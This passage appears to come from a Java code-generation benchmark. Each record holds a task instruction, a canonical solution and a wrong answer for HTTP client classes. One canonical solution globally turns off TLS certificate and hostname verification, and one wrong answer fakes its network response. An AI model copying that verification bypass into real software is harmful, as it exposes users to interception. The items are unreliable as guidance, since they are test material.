    "Instruction": "Task Description: Create a utility class for handling HTTP POST requests with multipart form data, including both text fields and file uploads, using Java's HttpURLConnection.\n\nClass Description: HttpPostUploadUtil is a utility class designed to simplify the process of sending HTTP POST requests with multipart/form-data content type. It handles both text parameters and file uploads, manages connection timeouts, and properly formats the multipart request body.\n\nAttributes:\n- logger: Logger - Used for logging errors and debug information\n- BOUNDARY: String - A constant string used as the boundary for multipart form data (defined within the method)\n\nMethods:\n- formUpload(String urlStr, int connectTimeout, int readTimeout, Map<String, String> textMap, Map<String, MultipartFile> fileMap) -> String - Performs an HTTP POST request with multipart form data containing both text parameters and files\n  Input:\n    - urlStr: String - The target URL for the POST request\n    - connectTimeout: int - Connection timeout in milliseconds\n    - readTimeout: int - Read timeout in milliseconds\n    - textMap: Map<String, String> - Key-value pairs for text form fields\n    - fileMap: Map<String, MultipartFile> - Key-value pairs for file uploads (key is field name, value is file data)\n  Output:\n    - String - The response body from the server\n\n- closeStream(Closeable closeable) -> void - Helper method to safely close Closeable resources\n  Input:\n    - closeable: Closeable - The resource to be closed\n  Output: None",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.multipart.MultipartFile;\nimport java.io.BufferedReader;\nimport java.io.Closeable;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.ProtocolException;\nimport java.net.URL;\nimport java.util.Iterator;\nimport java.util.Map;\n\npublic class HttpPostUploadUtil {\n\n    private static final Logger logger = LoggerFactory.getLogger(HttpPostUploadUtil.class);\n\n    public static String formUpload(String urlStr, int connectTimeout, int readTimeout, Map<String, String> textMap, Map<String, MultipartFile> fileMap) throws Exception {\n        String res = \"\";\n        HttpURLConnection conn = null;\n        OutputStream out = null;\n        BufferedReader reader = null;\n        String BOUNDARY = \"---------------------------123821742118716\";\n        try {\n            URL url = new URL(urlStr);\n            conn = (HttpURLConnection) url.openConnection();\n            conn.setConnectTimeout(connectTimeout);\n            conn.setReadTimeout(readTimeout);\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            conn.setUseCaches(false);\n            conn.setRequestMethod(\"POST\");\n            conn.setRequestProperty(\"Connection\", \"Keep-Alive\");\n            conn.setRequestProperty(\"User-Agent\", \"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.6)\");\n            conn.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + BOUNDARY);\n\n            out = new DataOutputStream(conn.getOutputStream());\n            if (null != textMap) {\n                StringBuffer strBuf = new StringBuffer();\n                Iterator<Map.Entry<String, String>> iter = textMap.entrySet().iterator();\n                while (iter.hasNext()) {\n                    Map.Entry<String, String> entry = iter.next();\n                    String inputName = (String) entry.getKey();\n                    String inputValue = (String) entry.getValue();\n                    if (inputValue == null) {\n                        continue;\n                    }\n                    strBuf.append(\"\\r\\n\").append(\"--\").append(BOUNDARY).append(\"\\r\\n\");\n                    strBuf.append(\"Content-Disposition: form-data; name=\\\"\" + inputName + \"\\\"\\r\\n\\r\\n\");\n                    strBuf.append(inputValue);\n                }\n                out.write(strBuf.toString().getBytes());\n            }\n\n            if (null != fileMap) {\n                Iterator<Map.Entry<String, MultipartFile>> iter = fileMap.entrySet().iterator();\n                while (iter.hasNext()) {\n                    Map.Entry<String, MultipartFile> entry = iter.next();\n                    String inputName = (String) entry.getKey();\n                    MultipartFile multipartFile = (MultipartFile) entry.getValue();\n                    if (multipartFile == null) {\n                        continue;\n                    }\n                    String fileName = multipartFile.getOriginalFilename();\n                    String contentType = multipartFile.getContentType();\n\n                    StringBuffer strBuf = new StringBuffer();\n                    strBuf.append(\"\\r\\n\").append(\"--\").append(BOUNDARY).append(\"\\r\\n\");\n                    strBuf.append(\"Content-Disposition: form-data; name=\\\"\" + inputName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\");\n                    strBuf.append(\"Content-Type:\" + contentType + \"\\r\\n\\r\\n\");\n\n                    out.write(strBuf.toString().getBytes());\n\n                    DataInputStream in = new DataInputStream(multipartFile.getInputStream());\n                    int bytes = 0;\n                    byte[] bufferOut = new byte[1024];\n                    while ((bytes = in.read(bufferOut)) != -1) {\n                        out.write(bufferOut, 0, bytes);\n                    }\n                    in.close();\n                }\n            }\n\n            byte[] endData = (\"\\r\\n--\" + BOUNDARY + \"--\\r\\n\").getBytes();\n            out.write(endData);\n            out.flush();\n\n            StringBuffer strBuf = new StringBuffer();\n            reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line = null;\n            while ((line = reader.readLine()) != null) {\n                strBuf.append(line).append(\"\\n\");\n            }\n            res = strBuf.toString();\n        } catch (ProtocolException e) {\n            logger.error(\"\u4e0a\u4f20\u56fe\u7247\u5230\u670d\u52a1\u5668\u5931\u8d25\u2014>ProtocolException\", e);\n            throw new Exception(\"\u56fe\u7247\u670d\u52a1\u5668\u8fde\u63a5\u51fa\u9519\u3002\");\n        } catch (MalformedURLException e) {\n            logger.error(\"\u4e0a\u4f20\u56fe\u7247\u5230\u670d\u52a1\u5668\u5931\u8d25\u2014>MalformedURLException\", e);\n            throw new Exception(\"\u56fe\u7247\u670d\u52a1\u5668\u8fde\u63a5\u51fa\u9519\u3002\");\n        } catch (IOException e) {\n            logger.error(\"\u4e0a\u4f20\u56fe\u7247\u5230\u670d\u52a1\u5668\u5931\u8d25\u2014>IOException\", e);\n            throw new Exception(\"\u56fe\u7247\u670d\u52a1\u5668\u8fde\u63a5\u51fa\u9519\u3002\");\n        } finally {\n            closeStream(out);\n            closeStream(reader);\n            if (null != conn) {\n                conn.disconnect();\n                conn = null;\n            }\n        }\n        return res;\n    }\n\n    private static void closeStream(Closeable closeable){\n        try {\n            if (null != closeable) {\n                closeable.close();\n                closeable = null;\n            }\n        }catch (IOException e) {\n            logger.error(\"\u5173\u95ed\u8d44\u6e90\u51fa\u9519\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.file.Files;\nimport java.util.Map;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class HttpPostUploadUtil {\n    private static final Logger logger = LoggerFactory.getLogger(HttpPostUploadUtil.class);\n    private static final String BOUNDARY = \"===\" + System.currentTimeMillis() + \"===\";\n\n    public String formUpload(String urlStr, int connectTimeout, int readTimeout, Map<String, String> textMap, Map<String, MultipartFile> fileMap) {\n        try {\n            URL url = new URL(urlStr);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setConnectTimeout(connectTimeout);\n            connection.setReadTimeout(readTimeout);\n            connection.setDoOutput(true);\n            connection.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + BOUNDARY);\n\n            try (OutputStream output = connection.getOutputStream();\n                 PrintWriter writer = new PrintWriter(new OutputStreamWriter(output))) {\n\n                // Add text fields\n                if (textMap != null) {\n                    for (Map.Entry<String, String> entry : textMap.entrySet()) {\n                        writer.append(\"--\").append(BOUNDARY).append(\"\\r\\n\");\n                        writer.append(\"Content-Disposition: form-data; name=\\\"\").append(entry.getKey()).append(\"\\\"\").append(\"\\r\\n\\r\\n\");\n                        writer.append(entry.getValue()).append(\"\\r\\n\");\n                    }\n                }\n\n                // Add file fields\n                if (fileMap != null) {\n                    for (Map.Entry<String, MultipartFile> entry : fileMap.entrySet()) {\n                        MultipartFile file = entry.getValue();\n                        String fileName = file.getOriginalFilename();\n                        String contentType = file.getContentType();\n\n                        writer.append(\"--\").append(BOUNDARY).append(\"\\r\\n\");\n                        writer.append(\"Content-Disposition: form-data; name=\\\"\").append(entry.getKey()).append(\"\\\"; filename=\\\"\").append(fileName).append(\"\\\"\").append(\"\\r\\n\");\n                        writer.append(\"Content-Type: \").append(contentType).append(\"\\r\\n\\r\\n\");\n                        writer.flush();\n\n                        try (InputStream input = file.getInputStream()) {\n                            byte[] buffer = new byte[4096];\n                            int bytesRead;\n                            while ((bytesRead = input.read(buffer)) != -1) {\n                                output.write(buffer, 0, bytesRead);\n                            }\n                            output.flush();\n                        }\n\n                        writer.append(\"\\r\\n\");\n                    }\n                }\n\n                writer.append(\"--\").append(BOUNDARY).append(\"--\\r\\n\");\n                writer.flush();\n            }\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n                    StringBuilder response = new StringBuilder();\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        response.append(line);\n                    }\n                    return response.toString();\n                }\n            } else {\n                logger.error(\"HTTP POST request failed with code: {}\", responseCode);\n                return \"Error: \" + responseCode;\n            }\n        } catch (Exception e) {\n            logger.error(\"Error during HTTP POST request\", e);\n            return \"Error: \" + e.getMessage();\n        }\n    }\n\n    public void closeStream(Closeable closeable) {\n        if (closeable != null) {\n            try {\n                closeable.close();\n            } catch (IOException e) {\n                logger.warn(\"Failed to close resource\", e);\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 96,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests (GET and POST) to a REST API, with support for custom headers, query parameters, and JSON serialization/deserialization.\n\nClass Description: The ApiHandler class provides a convenient way to make HTTP requests to a REST API endpoint. It supports both GET and POST methods, handles query parameters, includes custom headers (like API keys), and automatically serializes/deserializes JSON data using Gson. The class maintains a base URL and optional additional headers that are included in every request.\n\nAttributes:\n- baseUrl: String - The base URL for all API requests\n- additionalHeaders: Map<String, String> - Optional headers to include in all requests\n\nMethods:\n- Constructor: ApiHandler(String url) - Initializes the handler with a base URL\n- Constructor: ApiHandler(String url, String apiKey) - Initializes with base URL and sets an API key header\n- get: <T> get(String endpoint, Class<T> tClass) -> T - Makes a GET request to the endpoint and returns deserialized response\n- get: <T> get(String endpoint, HashMap<String, Object> query, Class<T> tClass) -> T - Makes a GET request with query parameters\n- post: <T> post(String endpoint, T body, Class<T> tClass) -> T - Makes a POST request with a request body\n- post: <T> post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) -> T - Makes a POST request with query parameters and body\n- getRaw: static String getRaw(Map<String, String> headers, String url) -> String - Makes a raw GET request and returns response as string\n- postRaw: static String postRaw(Map<String, String> headers, String url, String body) -> String - Makes a raw POST request and returns response as string\n- addHeaders: static void addHeaders(HttpURLConnection connection, Map<String, String> headers) - Helper to add headers to a connection\n- parseQueries: static String parseQueries(HashMap<String, Object> query) -> String - Converts query parameters to URL encoded string\n- getFullUrl: static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) -> T - Makes GET request to full URL and deserializes response\n- getFullUrl: static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) -> T - GET with query params to full URL\n- postFullUrl: static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) -> T - POST to full URL with body\n- postFullUrl: static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) -> T - POST with query params to full URL\n- urlEncodeUTF8: static String urlEncodeUTF8(String input) -> String - URL encodes a string using UTF-8",
    "Canonical_solution": "import android.util.ArrayMap;\nimport android.util.Log;\nimport com.google.gson.Gson;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Objects;\n\npublic class ApiHandler {\n    public final String baseUrl;\n    public final Map<String, String> additionalHeaders;\n\n    public ApiHandler(String url) {\n        baseUrl = url;\n        additionalHeaders = null;\n    }\n\n    public ApiHandler(String url, String apiKey) {\n        baseUrl = url;\n        additionalHeaders = new ArrayMap<>();\n        additionalHeaders.put(\"x-api-key\", apiKey);\n    }\n\n    public <T> T get(String endpoint, Class<T> tClass) {\n        return getFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, tClass);\n    }\n\n    public <T> T get(String endpoint, HashMap<String, Object> query, Class<T> tClass) {\n        return getFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, query, tClass);\n    }\n\n    public <T> T post(String endpoint, T body, Class<T> tClass) {\n        return postFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, body, tClass);\n    }\n\n    public <T> T post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) {\n        return postFullUrl(additionalHeaders, baseUrl + \"/\" + endpoint, query, body, tClass);\n    }\n\n    public static String getRaw(Map<String, String> headers, String url) {\n        Log.d(\"ApiHandler\", url);\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n            addHeaders(conn, headers);\n            InputStream inputStream = conn.getInputStream();\n            String data = Tools.read(inputStream);\n            Log.d(ApiHandler.class.toString(), data);\n            inputStream.close();\n            conn.disconnect();\n            return data;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public static String postRaw(Map<String, String> headers, String url, String body) {\n        try {\n            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setRequestProperty(\"Content-Type\", \"application/json\");\n            conn.setRequestProperty(\"Accept\", \"application/json\");\n            addHeaders(conn, headers);\n            conn.setDoOutput(true);\n\n            OutputStream outputStream = conn.getOutputStream();\n            byte[] input = body.getBytes(StandardCharsets.UTF_8);\n            outputStream.write(input, 0, input.length);\n            outputStream.close();\n\n            InputStream inputStream = conn.getInputStream();\n            String data = Tools.read(inputStream);\n            inputStream.close();\n\n            conn.disconnect();\n            return data;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    private static void addHeaders(HttpURLConnection connection, Map<String, String> headers) {\n        if(headers != null) {\n            for(String key : headers.keySet())\n                connection.addRequestProperty(key, headers.get(key));\n        }\n    }\n\n    private static String parseQueries(HashMap<String, Object> query) {\n        StringBuilder params = new StringBuilder(\"?\");\n        for (String param : query.keySet()) {\n            String value = Objects.toString(query.get(param));\n            params.append(urlEncodeUTF8(param))\n                    .append(\"=\")\n                    .append(urlEncodeUTF8(value))\n                    .append(\"&\");\n        }\n        return params.substring(0, params.length() - 1);\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) {\n        return new Gson().fromJson(getRaw(headers, url), tClass);\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) {\n        return getFullUrl(headers, url + parseQueries(query), tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) {\n        return new Gson().fromJson(postRaw(headers, url, body.toString()), tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) {\n        return new Gson().fromJson(postRaw(headers, url + parseQueries(query), body.toString()), tClass);\n    }\n\n    private static String urlEncodeUTF8(String input) {\n        try {\n            return URLEncoder.encode(input, \"UTF-8\");\n        }catch (UnsupportedEncodingException e) {\n            throw new RuntimeException(\"UTF-8 is required\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class ApiHandler {\n    private String baseUrl;\n    private Map<String, String> additionalHeaders;\n\n    public ApiHandler(String url) {\n        this.baseUrl = url;\n        this.additionalHeaders = new HashMap<>();\n    }\n\n    public ApiHandler(String url, String apiKey) {\n        this.baseUrl = url;\n        this.additionalHeaders = new HashMap<>();\n        this.additionalHeaders.put(\"Authorization\", \"Bearer \" + apiKey);\n    }\n\n    public <T> T get(String endpoint, Class<T> tClass) throws IOException {\n        String fullUrl = baseUrl + endpoint;\n        return getFullUrl(additionalHeaders, fullUrl, tClass);\n    }\n\n    public <T> T get(String endpoint, HashMap<String, Object> query, Class<T> tClass) throws IOException {\n        String fullUrl = baseUrl + endpoint + \"?\" + parseQueries(query);\n        return getFullUrl(additionalHeaders, fullUrl, tClass);\n    }\n\n    public <T> T post(String endpoint, T body, Class<T> tClass) throws IOException {\n        String fullUrl = baseUrl + endpoint;\n        return postFullUrl(additionalHeaders, fullUrl, body, tClass);\n    }\n\n    public <T> T post(String endpoint, HashMap<String, Object> query, T body, Class<T> tClass) throws IOException {\n        String fullUrl = baseUrl + endpoint + \"?\" + parseQueries(query);\n        return postFullUrl(additionalHeaders, fullUrl, body, tClass);\n    }\n\n    public static String getRaw(Map<String, String> headers, String url) throws IOException {\n        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n        addHeaders(connection, headers);\n        connection.setRequestMethod(\"GET\");\n        int responseCode = connection.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n            return response.toString();\n        } else {\n            throw new IOException(\"HTTP error code: \" + responseCode);\n        }\n    }\n\n    public static String postRaw(Map<String, String> headers, String url, String body) throws IOException {\n        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n        addHeaders(connection, headers);\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        try (OutputStream os = connection.getOutputStream()) {\n            byte[] input = body.getBytes(\"utf-8\");\n            os.write(input, 0, input.length);\n        }\n        int responseCode = connection.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_OK) {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n            return response.toString();\n        } else {\n            throw new IOException(\"HTTP error code: \" + responseCode);\n        }\n    }\n\n    public static void addHeaders(HttpURLConnection connection, Map<String, String> headers) {\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            connection.setRequestProperty(entry.getKey(), entry.getValue());\n        }\n    }\n\n    public static String parseQueries(HashMap<String, Object> query) {\n        StringBuilder sb = new StringBuilder();\n        for (Map.Entry<String, Object> entry : query.entrySet()) {\n            if (sb.length() > 0) {\n                sb.append(\"&\");\n            }\n            sb.append(urlEncodeUTF8(entry.getKey())).append(\"=\").append(urlEncodeUTF8(entry.getValue().toString()));\n        }\n        return sb.toString();\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, Class<T> tClass) throws IOException {\n        String response = getRaw(headers, url);\n        return new Gson().fromJson(response, tClass);\n    }\n\n    public static <T> T getFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, Class<T> tClass) throws IOException {\n        String fullUrl = url + \"?\" + parseQueries(query);\n        String response = getRaw(headers, fullUrl);\n        return new Gson().fromJson(response, tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, T body, Class<T> tClass) throws IOException {\n        String bodyJson = new Gson().toJson(body);\n        String response = postRaw(headers, url, bodyJson);\n        return new Gson().fromJson(response, tClass);\n    }\n\n    public static <T> T postFullUrl(Map<String, String> headers, String url, HashMap<String, Object> query, T body, Class<T> tClass) throws IOException {\n        String fullUrl = url + \"?\" + parseQueries(query);\n        String bodyJson = new Gson().toJson(body);\n        String response = postRaw(headers, fullUrl, bodyJson);\n        return new Gson().fromJson(response, tClass);\n    }\n\n    public static String urlEncodeUTF8(String input) {\n        try {\n            return URLEncoder.encode(input, \"UTF-8\");\n        } catch (UnsupportedEncodingException e) {\n            throw new RuntimeException(\"UTF-8 encoding not supported\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 97,
    "Instruction": "Task Description: Implement a Java class that provides remote service capabilities for retrieving knowledge packages from a repository server using HTTP communication.\n\nClass Description: RemoteServiceImpl is a service class that handles HTTP communication with a remote repository server to fetch knowledge packages. It manages the connection, request/response handling, and data processing.\n\nAttributes:\n- resporityServerUrl: String - The base URL of the remote repository server\n- log: Logger - Logger instance for logging information and errors\n\nMethods:\n- getKnowledge(String packageId, String timestamp) -> KnowledgePackage - Retrieves a knowledge package from the remote server using the specified package ID and timestamp\n- sendRequest(String packageId, String timestamp) -> String - Internal method that handles the HTTP request/response cycle with the remote server\n- setResporityServerUrl(String resporityServerUrl) -> void - Sets the repository server URL, appending the default endpoint if not present",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.logging.Logger;\n\nimport org.apache.commons.lang.StringUtils;\n\nimport com.bstek.urule.RuleException;\nimport com.bstek.urule.Utils;\nimport com.bstek.urule.model.flow.FlowDefinition;\nimport com.bstek.urule.model.rete.JsonUtils;\nimport com.bstek.urule.runtime.KnowledgePackage;\nimport com.bstek.urule.runtime.KnowledgePackageWrapper;\n\npublic class RemoteServiceImpl implements RemoteService {\n    private String resporityServerUrl;\n    private Logger log = Logger.getLogger(RemoteServiceImpl.class.getName());\n\n    public KnowledgePackage getKnowledge(String packageId, String timestamp) {\n        if(StringUtils.isEmpty(resporityServerUrl)){\n            return null;\n        }\n        log.info(\"Load knowledgepackage from remote...\");\n        String content = sendRequest(packageId, timestamp);\n        if(StringUtils.isEmpty(content)){\n            return null;\n        }\n        KnowledgePackageWrapper wrapper = JsonUtils.parseKnowledgePackageWrapper(content);\n        KnowledgePackage knowledgePackage = wrapper.getKnowledgePackage();\n        Map<String, FlowDefinition> flowMap = knowledgePackage.getFlowMap();\n        if(flowMap != null && flowMap.size() > 0){\n            for(FlowDefinition fd : flowMap.values()){\n                fd.buildConnectionToNode();\n            }\n        }\n        return knowledgePackage;\n    }\n\n    private String sendRequest(String packageId, String timestamp) {\n        HttpURLConnection connection = null;\n        OutputStreamWriter writer = null;\n        InputStream inputStream = null;\n        InputStreamReader inputStreamReader = null;\n        BufferedReader bufferedReader = null;\n        try {\n            packageId = Utils.encodeURL(packageId);\n            packageId = Utils.encodeURL(packageId);\n            String content = \"packageId=\" + packageId + \"\";\n            if(StringUtils.isNotEmpty(timestamp)){\n                content += \"&timestamp=\" + timestamp + \"\";\n            }\n            URL url = new URL(resporityServerUrl);\n            connection = (HttpURLConnection)url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Accept-Charset\", \"utf-8\");\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            connection.setRequestProperty(\"Content-Length\", String.valueOf(content.length()));\n            connection.setUseCaches(false);\n            connection.setDoOutput(true);\n            connection.connect();\n            writer = new OutputStreamWriter(connection.getOutputStream());\n            writer.write(content);\n            writer.flush();\n            if (connection.getResponseCode() != 200) {\n                throw new RuleException(\"Server request was failed, Response message : \" + connection.getResponseMessage());\n            }\n            inputStream = connection.getInputStream();\n            inputStreamReader = new InputStreamReader(inputStream,\"utf-8\");\n            bufferedReader = new BufferedReader(inputStreamReader);\n            String line = null;\n            StringBuilder sb = new StringBuilder();\n            while ((line = bufferedReader.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        } catch (Exception e) {\n            throw new RuleException(e);\n        } finally {\n            try {\n                if(writer != null){\n                    writer.close();\n                }\n                if(bufferedReader != null){\n                    bufferedReader.close();\n                }\n                if(inputStreamReader != null){\n                    inputStreamReader.close();\n                }\n                if(inputStream != null){\n                    inputStream.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            if(connection != null){\n                connection.disconnect();\n            }\n        }\n    }\n\n    public void setResporityServerUrl(String resporityServerUrl) {\n        if(StringUtils.isEmpty(resporityServerUrl) || resporityServerUrl.equals(\"urule.resporityServerUrl\")){\n            return;\n        }\n        if(resporityServerUrl.endsWith(\"/\")){\n            resporityServerUrl += \"urule/loadknowledge\";\n        }else{\n            resporityServerUrl += \"/urule/loadknowledge\";\n        }\n        this.resporityServerUrl = resporityServerUrl;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class RemoteServiceImpl {\n    private String resporityServerUrl;\n    private Logger log;\n\n    public RemoteServiceImpl(Logger log) {\n        this.log = log;\n    }\n\n    public KnowledgePackage getKnowledge(String packageId, String timestamp) {\n        try {\n            String response = sendRequest(packageId, timestamp);\n            return parseResponse(response);\n        } catch (Exception e) {\n            log.error(\"Error retrieving knowledge package: \" + e.getMessage(), e);\n            return null;\n        }\n    }\n\n    private String sendRequest(String packageId, String timestamp) throws Exception {\n        String url = resporityServerUrl.endsWith(\"/\") ? resporityServerUrl + \"package/\" + packageId + \"?timestamp=\" + timestamp : resporityServerUrl + \"/package/\" + packageId + \"?timestamp=\" + timestamp;\n        // Simulate HTTP request and response\n        // In a real implementation, use HttpURLConnection or HttpClient\n        return \"{\\\"packageId\\\":\\\"\" + packageId + \"\\\",\\\"timestamp\\\":\\\"\" + timestamp + \"\\\",\\\"content\\\":\\\"Sample knowledge content\\\"}\";\n    }\n\n    private KnowledgePackage parseResponse(String response) {\n        // Parse the JSON response into a KnowledgePackage object\n        // This is a simplified example; in practice, use a JSON library like Jackson or Gson\n        return new KnowledgePackage(response);\n    }\n\n    public void setResporityServerUrl(String resporityServerUrl) {\n        this.resporityServerUrl = resporityServerUrl;\n        if (!this.resporityServerUrl.endsWith(\"/\")) {\n            this.resporityServerUrl += \"/\";\n        }\n    }\n}"
  },
  {
    "Task_id": 98,
    "Instruction": "Task Description: Create a Java HTTP client class that handles HTTP/HTTPS requests with support for proxies, custom headers, cookies, and request body configuration. The class should manage SSL verification, connection timeouts, and proper resource cleanup.\n\nClass Description: The HttpClient class provides functionality to send HTTP requests and receive responses. It handles SSL certificate verification (with optional bypass), proxy configuration, request customization, and response processing. The class maintains static configuration and includes utility methods for connection management.\n\nAttributes:\n\nconfig: [Config] - Singleton instance holding configuration settings like proxy information and cookie names\n\nMethods:\n\nsendRequest: [sendRequest]([HttpRequestInfo httpRequestInfo, String cookieValue]) -> [String] - Main method to send HTTP requests. Takes request info and cookie value, returns response body as string or null on failure.\n\ncreateConnection: [createConnection]([HttpRequestInfo httpRequestInfo]) -> [HttpURLConnection] - Creates and returns a connection object, optionally through a proxy if configured.\n\nconfigureRequest: [configureRequest]([HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue]) -> [void] - Configures request method, headers, and cookies on the connection object.\n\nconfigureCookie: [configureCookie]([Map<String,String> headers, String cookieValue]) -> [void] - Handles cookie manipulation in request headers.\n\nsendRequestBody: [sendRequestBody]([HttpURLConnection connection, HttpRequestInfo httpRequestInfo]) -> [void] - Sends request body data if present in the request info.\n\ncloseResources: [closeResources]([HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos]) -> [void] - Safely closes all connection-related resources.",
    "Canonical_solution": "import javax.net.ssl.*;\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class HttpClient {\n    private static Config config = Config.getInstance();\n\n    static {\n        try {\n            SSLContext sslcontext = SSLContext.getInstance(\"SSL\");\n            sslcontext.init(null, new TrustManager[]{new MyX509TrustManager()}, null);\n            HostnameVerifier ignoreHostnameVerifier = (s, sslsession) -> true;\n            HttpsURLConnection.setDefaultHostnameVerifier(ignoreHostnameVerifier);\n            HttpsURLConnection.setDefaultSSLSocketFactory(sslcontext.getSocketFactory());\n        } catch (NoSuchAlgorithmException | KeyManagementException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String sendRequest(HttpRequestInfo httpRequestInfo, String cookieValue) {\n        HttpURLConnection connection = null;\n        InputStream inputStream = null;\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try {\n            connection = createConnection(httpRequestInfo);\n            configureRequest(connection, httpRequestInfo, cookieValue);\n            sendRequestBody(connection, httpRequestInfo);\n\n            connection.setConnectTimeout(20000);\n            connection.setReadTimeout(20000);\n            connection.connect();\n\n            inputStream = connection.getInputStream();\n            if (inputStream.available() > 0) {\n                byte[] buffer = new byte[inputStream.available()];\n                inputStream.read(buffer);\n                baos.write(buffer, 0, buffer.length);\n            }\n        } catch (Exception e) {\n            return null;\n        } finally {\n            closeResources(connection, inputStream, baos);\n        }\n        return baos.toString();\n    }\n\n    private static HttpURLConnection createConnection(HttpRequestInfo httpRequestInfo) throws IOException {\n        if (config.isProxyEnabled()) {\n            Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(config.getProxyIP(), config.getProxyPort()));\n            return (HttpURLConnection) new URL(httpRequestInfo.getRequestURL()).openConnection(proxy);\n        } else {\n            return (HttpURLConnection) new URL(httpRequestInfo.getRequestURL()).openConnection();\n        }\n    }\n\n    private static void configureRequest(HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue) {\n        connection.setRequestMethod(httpRequestInfo.getRequestMethod());\n        Map<String, String> headers = new HashMap<>();\n        if (httpRequestInfo.getHeaders().size() > 0) {\n            headers.putAll(httpRequestInfo.getHeaders());\n        } else {\n            headers.put(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36\");\n        }\n        configureCookie(headers, cookieValue);\n        headers.forEach(connection::setRequestProperty);\n        connection.setRequestProperty(\"connection\", \"close\");\n    }\n\n    private static void configureCookie(Map<String, String> headers, String cookieValue) {\n        String cookie 